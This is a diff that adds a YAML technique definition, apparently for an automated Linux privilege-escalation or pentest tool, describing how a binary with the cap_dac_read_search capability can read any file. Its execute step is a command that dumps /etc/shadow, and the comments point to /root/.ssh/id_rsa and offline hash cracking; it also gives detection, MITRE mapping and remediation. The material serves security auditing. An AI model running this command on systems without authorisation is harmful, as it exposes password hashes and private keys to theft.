@@ -1,0 +1,42 @@
+# cap_dac_read_search → read any file (typically /etc/shadow)
+#
+# Capabilities are the fine-grained SUID replacement — a binary can be
+# granted specific privileges without inheriting full root. cap_dac_read_search
+# bypasses DAC read checks, so a process with it can open any file for reading
+# regardless of ownership or mode. The classic use is dumping /etc/shadow (or
+# /root/.ssh/id_rsa) with a non-root shell.
+#
+# The command uses {{binary}} — the adapter substitutes the actual binary
+# basename that carries the capability. If getcap reports "openssl
+# cap_dac_read_search+ep", the command becomes "openssl /etc/shadow …".
+#
+# MITRE: T1548.001 (Setuid/Setgid) is the closest umbrella — capabilities
+# are the modern granular replacement.
+technique: T1548.001
+name: cap_dac_read_search → read /etc/shadow (any file)
+tactic: [privilege-escalation, credential-access]
+platform: [linux]
+ranking:
+  exploitability: medium    # depends on target file being useful; shadow is universal
+  safety: read-only          # opens files, writes nothing
+  detection: quiet
+detect:
+  capability: cap_dac_read_search
+execute:
+  command: |-
+    {{binary}} /etc/shadow 2>/dev/null | head
+verify:
+  success: "root:"          # /etc/shadow's root line — proof the DAC bypass worked
+cleanup:
+  command: ""               # no target-side mutation
+report:
+  vector_type: capability
+  description: >
+    A binary with cap_dac_read_search can open any file for reading regardless
+    of DAC permissions. Dumping /etc/shadow lets the operator crack password
+    hashes offline; /root/.ssh/id_rsa gives immediate root SSH.
+  remediation: >
+    Remove the capability: `setcap -r {binary}`. If the binary needs read
+    access to specific files, use a purpose-built helper with ACLs on the
+    target files instead of granting global read bypass.
+  refs: [T1548.001, T1552.004, capabilities(7)]
